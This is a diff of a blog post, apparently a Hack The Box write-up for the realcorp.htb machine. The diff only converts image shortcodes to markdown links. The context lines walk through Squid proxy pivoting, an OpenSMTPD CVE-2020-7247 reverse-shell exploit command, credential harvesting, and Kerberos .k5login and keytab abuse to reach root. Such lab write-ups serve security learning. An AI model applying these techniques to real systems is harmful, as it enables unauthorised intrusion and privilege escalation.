@@ -42,7 +42,7 @@ A small selection of ports. We also have a leaked hostname of `realcorp.htb`. We
 
 
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-23.png" >}}
+![](/images/2021/06/image-23.png)
 
 Just an error, but we do see a email and vhost as well - `srv01.realcorp.htb`. We'll add these to our host file and start enumerating them. There are a few ways to enumerate subdomains. Here's a [good resource](https://www.offensity.com/de/blog/just-another-recon-guide-pentesters-and-bug-bounty-hunters/) for subdomain enumeration. In this case we'll just use a simple `dnsenum`, it's built into Kali and works just fine for the CTF usecase.
 
@@ -51,13 +51,13 @@ Command:
 
 We get quite a few items listed.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-24.png" >}}
+![](/images/2021/06/image-24.png)
 
 So even when we add these hostnames to our system, we aren't able to get any type of resolution. We are still met with the `Squid` proxy page. So there's a good chance we need to use the `Squid` proxy that's being shown to interact past what we are currently seeing. There are also a few ways to do this, we can install `Squid` on our machine and communicate that way or we can use the built in `proxychains` tool (`Proxychains` is only available nativly if you leverage `apt install kali-linux-everything` otherwise you'll need to `apt install` the package). Here's [quick blurb](https://book.hacktricks.xyz/pentesting/3128-pentesting-squid) on leveraging `proxychains` and `squid`.
 
 In this case, configuring `Proxychains` to leverage the `Squid` web proxy is easy. We can edit the `proxychain4.conf` file. This file is located in `/etc/` directly.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-26.png" >}}
+![](/images/2021/06/image-26.png)
 
 I had some issues getting data across the proxychain, this was because I'm an idiot and had some explicit firewall settings setup prior. Don't be me, double check your firewall rules...
 
@@ -66,11 +66,11 @@ Command:
 
 Eventually, we should get back our `nmap` scan results:
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-28.png" >}}
+![](/images/2021/06/image-28.png)
 
 Perfect, some services running that are much interesting. We can add `wpad.realcorp.htb` to our hosts file. Now when we try and `curl` the `wpad` url, we should see somthing.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-29.png" >}}
+![](/images/2021/06/image-29.png)
 
 or not... In this case, we pretty much knew nothing was going to come back, since that's not the purpose of a `wpad` dns entry. This entry should host a `wpad.dat` file to help us find the proper routes. You can read up more on `wpad` [here](https://en.wikipedia.org/wiki/Web_Proxy_Auto-Discovery_Protocol#:~:text=The%20Web%20Proxy%20Auto%2DDiscovery,proxy%20for%20a%20specified%20URL.).
 
@@ -81,7 +81,7 @@ Command:
 
 Sure enough, some routes come back
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-30.png" >}}
+![](/images/2021/06/image-30.png)
 
 This file tells us there are active services running in the 10.241.251.1(/24?) space. Let's try and find them with `nmap`.
 
@@ -90,11 +90,11 @@ Command:
 
 Eventually we find one machine that's alive: `10.241.251.113`. We use `nmap` to enumerate this machine further and see that it's running `OpenSMTPD`. A quick `searchsploit` shows there are a few PoC codes for this service.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-31.png" >}}
+![](/images/2021/06/image-31.png)
 
 After some trial and error, we see that the `OpenSMTPD` 6.6.1 exploit seems to be valid.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-32.png" >}}
+![](/images/2021/06/image-32.png)
 
 So now we will give it the old `Bash` reverse shell and have it connect back to our `Netcat` listener. Turns out, this won't work for us, the code needs to be modified a bit more. Now, I didn't modify the code, I just searched for another and found this: https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py.
 
@@ -103,7 +103,7 @@ We have an email from our earlier enumeration - j.nakazawa@realcorp.htb. So we c
 Command:
 `proxychains python3 exploit.py 10.241.251.113 25 10.10.14.101 7070 j.nakazawa@realcorp.htb`
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/smtp_accerss.gif" >}}
+![](/images/2021/06/smtp_accerss.gif)
 
 Awesome, now we have a foothold! Now what? We can enumerate more! We find a file called `.msmtprc`. Inside we have a password, yes! We try to login with it aaannddd nope. Denied. There are some login controls in place here. If we look back at our port scan on the box, we remember seeing three ports for kerberos. Looks like we'll need to generate a kerberos ticket to log in with. This isn't as hard as it might sound. 
 
@@ -116,9 +116,9 @@ Next we add our target to the config file as the primary kdc. This file is under
 
 We need to edit a few lines, first our `default_realm`, that needs to be our target domain, `REALCORP.HTB`. Next we need to add a new realm of `REALCORP.HTB`. Then add  the `domain_realm` for this domain. All in all these are what the modified lines should look like:
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-38.png" >}}
+![](/images/2021/06/image-38.png)
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-36.png" >}}
+![](/images/2021/06/image-36.png)
 
 Now we can use the `kinit` command to generate ourselves a ticket for j.nakazawa.
 
@@ -127,25 +127,25 @@ Command:
 
 We don't get a response, so we check the kerberos table with `klist` and we should see a ticket!
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-39.png" >}}
+![](/images/2021/06/image-39.png)
 
 Now we should be able to SSH into the box!
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-40.png" >}}
+![](/images/2021/06/image-40.png)
 
 We get in and snag our `user.txt` flag! Now we can start enumerating more to identify a priv esc. We download over `linpeas` and some other enumeration tools and start poking around.
 
 We find this entry that stands out a bit:
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-41.png" >}}
+![](/images/2021/06/image-41.png)
 
 It's in a location that can be globally accessed and we have execute rights on. As we keep sifting through the output we also see it's called on a cron:
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-42.png" >}}
+![](/images/2021/06/image-42.png)
 
 We can take a look at the script being called.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-43.png" >}}
+![](/images/2021/06/image-43.png)
 
 Interesting, we are syncing over items from `/var/log/squid/` to `/home/admin`. Awesome, normally, we could copy over an `SSH` key or something but in this case, we're just going to copy over the kerberos auth file. [Here is some](https://web.mit.edu/kerberos/krb5-devel/doc/user/user_config/k5login.html) reading about how a `.k5login` file works. From the above:
 
@@ -159,11 +159,11 @@ Commands:
 
 After we do that, we should be able to `SSH` into the machine as admin.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-44.png" >}}
+![](/images/2021/06/image-44.png)
 
 Awesome, we're up one more user, let's re-run our enumeration. An interesting set of lines shows up:
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-45.png" >}}
+![](/images/2021/06/image-45.png)
 
 We see a file `/etc/krb5.keytab` being read bia an impersonation command. Some qiuck googling gives us [this](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5/doc/krb5-install/The-Keytab-File.html). Fully compromise a system eh? Let's try and get to that! Dig up the [manual](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html) for `kadmin` and try to add our user to the `krb5.keytab` file.
 
@@ -172,7 +172,7 @@ Command:
 
 If this works, we are prompted with the `kadmin` interface.
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/image-46.png" >}}
+![](/images/2021/06/image-46.png)
 
 Now we need to add our user ticket to the root account.
 
@@ -184,7 +184,7 @@ We make a password for the account and  `exit` from the interface. Now we can tr
 Command:
 `ksu root`
 
-{{< figure src="__GHOST_URL__/content/images/2021/06/tent_root.gif" >}}
+![](/images/2021/06/tent_root.gif)
 
 There we have it! The `root.txt` flag! This was a very fun and realistic machine. This is along the same lines of machines you can find as a Red Team Operator, I know I've seen my fair share of improper Kerberos implimentations in Linux.
 
